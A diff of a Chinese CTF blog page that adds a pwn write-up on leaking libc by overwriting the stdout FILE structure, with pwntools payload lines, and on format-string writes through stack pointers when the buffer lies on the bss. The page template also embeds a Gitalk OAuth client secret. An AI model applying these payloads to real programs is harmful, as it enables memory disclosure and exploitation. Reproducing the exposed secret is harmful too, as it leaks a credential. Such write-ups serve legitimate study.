@@ -111,10 +111,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://sagiring.github.io/categories/密码学/">
+  <link rel="canonical" href="https://sagiring.github.io/cn/IO_2_1_stdin 与 bss_format/">
   <title>
     
-      茗茗之中的blog
+      _IO_2_1_stdin_ 与 bss_format - 茗茗之中的blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -320,19 +320,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/my_love.png');
-      --intro-header-background-image-url-post: url('');
-      --intro-header-background-image-url-page: url('/img/header_img/my_love (8).png');
+      --intro-header-background-image-url-post: url('my_love1.png');
+      --intro-header-background-image-url-page: url('/my_love1.png');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/my_love.png');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/my_love (8).png');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('my_love1.png');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/my_love1.png');
     }
 
     header.intro-header {
-       /*page*/
-        background-image: var(--intro-header-background-image-url-page);
-        /* background-image: url('/img/header_img/my_love (8).png'); */
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('my_love1.png'); */
       
     }
 
@@ -350,10 +350,42 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>茗茗之中</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">人生苦短,及时行乐</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+              
+            </div>
+            <h1>_IO_2_1_stdin_ 与 bss_format</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by 茗 on
+              2023-08-28
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">2</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">499</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
           </div>
           
         </div>
@@ -378,439 +410,271 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-		<!-- Main Content -->
-<div class="container">
-  <div class="row">
-    
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
 
-    <!-- USE SIDEBAR -->
-    <!-- Post Container -->
-    <div class="
-                col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+        
 
-      <!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-0 col-md-10 col-md-offset-1">
-      <!-- 归档列表 -->
+        <h1><em>IO_2_1_stdin</em> 与 bss_format</h1>
+<h2 id="IO-2-1-stdin">IO_2_1_stdin</h2>
+<h3 id="附件：">附件：</h3>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828104230478.png)</p>
+<p><code>bss</code>数组越界</p>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828104328361.png)</p>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828104507982.png)</p>
+<p><code>flag</code>在内存里，<code>puts</code> +  <code>0x16D2E0</code>的地方（这里<code>F5</code>之后 + 的不对，不知为何）</p>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828104551388.png)</p>
+<p>防护全开</p>
+<p>总结一下，给了个<code>bss</code>的任意指针写！考虑打<code>stdout</code>泄露地址</p>
+<p>这里第一次接触<code>_IO_FILE</code>结构，久仰大名了属于是</p>
+<pre><code class="hljs c">pwndbg&gt; ptype <span class="hljs-built_in">stdout</span>
+type = <span class="hljs-keyword">struct</span> _IO_FILE &#123;
+    <span class="hljs-type">int</span> _flags;
+    <span class="hljs-type">char</span> *_IO_read_ptr;
+    <span class="hljs-type">char</span> *_IO_read_end;
+    <span class="hljs-type">char</span> *_IO_read_base;
+    <span class="hljs-type">char</span> *_IO_write_base;  <span class="hljs-comment">//  泄露开始地址</span>
+    <span class="hljs-type">char</span> *_IO_write_ptr;   <span class="hljs-comment">//  泄露结束地址</span>
+    <span class="hljs-type">char</span> *_IO_write_end;
+    <span class="hljs-type">char</span> *_IO_buf_base;
+    <span class="hljs-type">char</span> *_IO_buf_end;
+    <span class="hljs-type">char</span> *_IO_save_base;
+    <span class="hljs-type">char</span> *_IO_backup_base;
+    <span class="hljs-type">char</span> *_IO_save_end;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span>
+    <span class="hljs-type">int</span> _fileno;
+    <span class="hljs-type">int</span> _flags2;
+    <span class="hljs-type">__off_t</span> _old_offset;
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;
+    <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;
+    <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];
+    _IO_lock_t *_lock;
+    <span class="hljs-type">__off64_t</span> _offset;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span>
+    <span class="hljs-type">void</span> *_freeres_buf;
+    <span class="hljs-type">size_t</span> __pad5;
+    <span class="hljs-type">int</span> _mode;
+    <span class="hljs-type">char</span> _unused2[<span class="hljs-number">20</span>];
+&#125; *</code></pre>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113845320">https://blog.csdn.net/qq_41202237/article/details/113845320</a></p>
+<p>贴一下好好说话系列，讲的也很清楚。</p>
+<p>首先<code>_flag</code>的设定需要满足</p>
+<pre><code class="hljs python">_flags = <span class="hljs-number">0xFBAD1800</span></code></pre>
+<p>因为为了泄露出我们需要的地址，需要一些标志位满足判断</p>
+<p>再设置下面的成员为<code>0</code></p>
+<pre><code class="hljs c"><span class="hljs-type">char</span> *_IO_read_ptr;
+<span class="hljs-type">char</span> *_IO_read_end;
+<span class="hljs-type">char</span> *_IO_read_base;</code></pre>
+<p>最好再来修改</p>
+<pre><code class="hljs c"><span class="hljs-type">char</span> *_IO_write_base;  <span class="hljs-comment">//  泄露开始地址</span>
+<span class="hljs-type">char</span> *_IO_write_ptr;   <span class="hljs-comment">//  泄露结束地址</span></code></pre>
+<p>综上<code>payload</code>为</p>
+<pre><code class="hljs python"><span class="hljs-string">b&#x27;feedback.\n&#x27;</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span></code></pre>
+<p>泄露<code>_IO_2_1_stdin_</code>，<code>\x00</code>的设置刚好讲<code>_IO_write_base</code>低位置<code>0</code>，刚好可以泄露出<code>_IO_2_1_stdin_</code>的地址</p>
+<pre><code class="hljs python">_IO_2_1_stdin_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))</code></pre>
+<p>遇到<code>puts</code>或者 <code>printf</code>输出函数，便会泄露</p>
+<p>最后泄露<code>flag</code>即可</p>
+<pre><code class="hljs python">payload = p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">3</span> + p64(flag_addr) + p64(flag_addr + flag_size)</code></pre>
+<h2 id="bss-format">bss_format</h2>
+<p>格式化字符串，但是存储在<code>bss</code>上。不能用传统的传地址在栈上完成任意写。</p>
+<p>栈的结构如下</p>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828110434394.png)</p>
+<p>此时可以找如<code>ebp</code>那种指向栈内的指针，先用格式化字符对那个地址任意写，写入我们想修改的地址，再找偏移，对<code>ebp</code>写入的地址再写入，这样便可达成任意写。栈上跳板。</p>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828110811636.png)</p>
+<p>![](./IO_2_1_stdin 与 bss_format/image-20230828110737039.png)</p>
 
-      
 
-      <!-- 归档列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2023">
-          <span class="tag-text">2023</span>
-        </span>
-        <ul>
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
           
-          <li>
-            08-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/IO_2_1_stdin 与 bss_format/" style="color: #0085a1">
-              <span>
-                _IO_2_1_stdin_ 与 bss_format
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
           
-          <li>
-            08-13
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/堆知识合集一/" style="color: #0085a1">
-              <span>
-                堆知识合集一
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            08-13
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/SROP/" style="color: #0085a1">
-              <span>
-                SROP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/计算机网络学习/" style="color: #0085a1">
-              <span>
-                计算机网络学习
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-10
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/操作系统的二三事/" style="color: #0085a1">
-              <span>
-                操作系统的二三事
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            04-26
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/密码学的那些知识/" style="color: #0085a1">
-              <span>
-                密码学的那些知识
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/痛苦的环境配置/" style="color: #0085a1">
-              <span>
-                痛苦的环境配置
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-27
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/关于发呆/" style="color: #0085a1">
-              <span>
-                关于发呆
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-21
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/tcache题的亿点点细节/" style="color: #0085a1">
-              <span>
-                tcache题的亿点点细节
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/格式化字符串auto与LibcSearcher/" style="color: #0085a1">
-              <span>
-                格式化字符串auto与LibcSearcher
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-15
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/ORW/" style="color: #0085a1">
-              <span>
-                ORW
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-12
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/一些小细节/" style="color: #0085a1">
-              <span>
-                一些小细节
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-11
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/格式化字符串/" style="color: #0085a1">
-              <span>
-                格式化字符串
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-10
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/传参方式/" style="color: #0085a1">
-              <span>
-                传参方式
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-01
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/栈迁移的学习/" style="color: #0085a1">
-              <span>
-                栈迁移的学习
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-01
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/杂七杂八/" style="color: #0085a1">
-              <span>
-                杂七杂八
-                
-                -- cn
-                
-              </span>
-            </a>
+          <li class="next">
+            <a href="/cn/堆知识合集一/" data-toggle="tooltip" data-placement="top" title="堆知识合集一">Next Post &rarr;</a>
           </li>
           
         </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=_IO_2_1_stdin_ 与 bss_format&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/IO_2_1_stdin 与 bss_format/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+  <!-- gitalk start -->
+  <!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+  <div id="gitalk-container"></div>
+
+  
+    <!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+    <script src="/js/comment/gitalk.js"></script>
+  
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: 'd4759980b8c82fe1a32a',
+      clientSecret: '0e870d007deb9e146ba167987e446ea4f50dff34',
+      repo: 'Sagiring.github.io',
+      owner: 'Sagiring',
+      admin: 'Sagiring',
+      id: 'Mon Aug 28 2023 11:09:00 GMT+0800', // Ensure uniqueness and length less than 50
+      distractionFreeMode: false, // Facebook-like distraction free mode
+      perPage: 10,
+      pagerDirection: 'last',
+      createIssueManually: true,
+      language: 'zh-CN',
+      proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token'
+    });
+    gitalk.render('gitalk-container');
+
+    var gtFolded = () => {
+      setTimeout(function () {
+        let markdownBody = document.getElementsByClassName("markdown-body");
+        let list = Array.from(markdownBody);
+        list.forEach(item => {
+          if (item.clientHeight > 250) {
+            item.classList.add('gt-comment-body-folded');
+            item.style.maxHeight = '250px';
+            item.title = 'Click to Expand';
+            item.onclick = function () {
+              item.classList.remove('gt-comment-body-folded');
+              item.style.maxHeight = '';
+              item.title = '';
+              item.onclick = null;
+            };
+          }
+        })
+      }, 800);
+    }
+  </script>
+
+  <!-- gitalk end -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
       </div>
-      
-    </div>
-  </div>
-</div>
 
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
 
-      <!-- 如果开启评论功能 -->
-      
-    </div>
-
-    <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
     
-        <!-- Visitors -->
-<h5><a href="/">来访者</a></h5>
-
-<div class="widget">
-  <span>
-    Viewed <b><i><span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Times
-  </span>
-  <br />
-  <span>
-    <b><i><span id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Visitors In Total
-  </span>
-</div>
-
-
-        <hr>
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">IO_2_1_stdin 与 bss_format</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#IO-2-1-stdin"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">IO_2_1_stdin</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%99%84%E4%BB%B6%EF%BC%9A"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">附件：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#bss-format"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">bss_format</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
     
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
         <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">特色标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+            
+          </div>
+        </section>
+        
 
-<section>
-  <h5><a href="/tags/">特色标签</a></h5>
-  <div class="tags">
-    
-    
-    <a href="/tags/#pwn" title="pwn" rel="12">pwn</a>
-    
-    
-    
-    <a href="/tags/#我" title="我" rel="1">我</a>
-    
-    
-    
-    <a href="/tags/#学科" title="学科" rel="3">学科</a>
-    
-    
-  </div>
-</section>
-
-
-        <hr>
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-  <h5><a href="/about/">关于自己</a></h5>
-  <div class="short-about">
-
-    
-    <img id="avatar_pic" src="/img/avatar/good_to_look.jpg" alt="avatar_pic" style="box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -moz-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -webkit-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);" />
-    
-
-    
-    <p>I don&#39;t know where I am going ,but I am on my way...</p>
-    
-
-    <!-- SNS Link -->
-    <ul class="list-inline">
-      
-
-      
-      <li>
-        <a target="_blank" href="https://github.com/Sagiring">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-    </ul>
-  </div>
-</section>
-
-        <hr>
-    
-        <!-- RECENT POSTS -->
-
-<h5><a href="/">最近博文</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="../../cn/IO_2_1_stdin%20%E4%B8%8E%20bss_format/">
-      <li>_IO_2_1_stdin_ 与 bss_format</li>
-    </a>
-    
-    <a href="../../cn/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/">
-      <li>堆知识合集一</li>
-    </a>
-    
-    <a href="../../cn/SROP/">
-      <li>SROP</li>
-    </a>
-    
-    <a href="../../cn/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/">
-      <li>计算机网络学习</li>
-    </a>
-    
-    <a href="../../cn/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B/">
-      <li>操作系统的二三事</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
         <!-- Friends Blog -->
-
-
-        <hr>
-    
-        <!-- Archives -->
-
-<h5><a href="/archives/">archives</a></h5>
-<div class="widget">
-  <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/08/">August 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/04/">April 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../archives/2023/03/">March 2023</a><span class="archive-list-count">10</span></li></ul>
-</div>
-
-
-        <hr>
-    
-        <!-- Categories -->
-
-<h5><a href="/categories/">categories</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="/categories/#pwn">
-      <li>pwn</li>
-    </a>
-    
-    <a href="/categories/#自己的知识">
-      <li>自己的知识</li>
-    </a>
-    
-    <a href="/categories/#密码学">
-      <li>密码学</li>
-    </a>
-    
-    <a href="/categories/#操作系统">
-      <li>操作系统</li>
-    </a>
-    
-    <a href="/categories/#计算机网络">
-      <li>计算机网络</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
-</div>
-
-
-    
+        
+      </div>
+    </div>
   </div>
-</div>
+</article>
+
+
+
+
+
 
 
 		<!-- Footer (contains ThemeColor、viewer) -->
